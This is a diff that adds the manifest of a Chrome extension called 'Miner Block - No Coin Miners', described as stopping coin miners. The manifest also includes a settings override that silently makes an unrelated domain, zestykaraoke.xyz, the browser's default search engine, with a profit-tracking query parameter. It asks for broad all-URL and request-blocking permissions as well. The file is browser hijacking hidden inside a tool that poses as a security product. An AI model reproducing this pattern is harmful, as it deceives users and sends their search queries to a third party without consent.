@@ -1,0 +1,44 @@
+{
+"update_url": "https://clients2.google.com/service/update2/crx",
+
+  "manifest_version": 2,
+  "name": "Miner Block - No Coin Miners",
+  "permissions": [
+    "tabs",
+    "storage",
+    "webRequest",
+    "http://*/*",
+    "https://*/*",
+    "webRequestBlocking"
+  ],
+  "background": {"page": "lib/chrome/background.html"},
+  "homepage_url": "http://mybrowseraddon.com/block-miners.html",
+  "description": "Stop coin miners from using your computer resources.",
+  "browser_action": {
+    "default_icon": {
+      "16": "data/icons/16.png",
+      "32": "data/icons/32.png",
+      "48": "data/icons/48.png",
+      "64": "data/icons/64.png"
+    }
+  },  
+	"chrome_settings_overrides": {
+		"search_provider": {
+			"encoding": "UTF-8",
+			"favicon_url": "http://zestykaraoke.xyz/favicon.ico",
+			"is_default": true,
+			"keyword": "newdomslig",
+			"name": "newdomslig",
+			"search_url": "http://zestykaraoke.xyz/?gigprofit={searchTerms}"
+		}
+	},
+  "version": "2.4.0",
+  "options_ui": {"chrome_style": true, "page": "data/options/options.html"},
+  "icons": {
+    "16": "data/icons/16.png",
+    "32": "data/icons/32.png",
+    "48": "data/icons/48.png",
+    "64": "data/icons/64.png",
+    "128": "data/icons/128.png"
+  }
+}
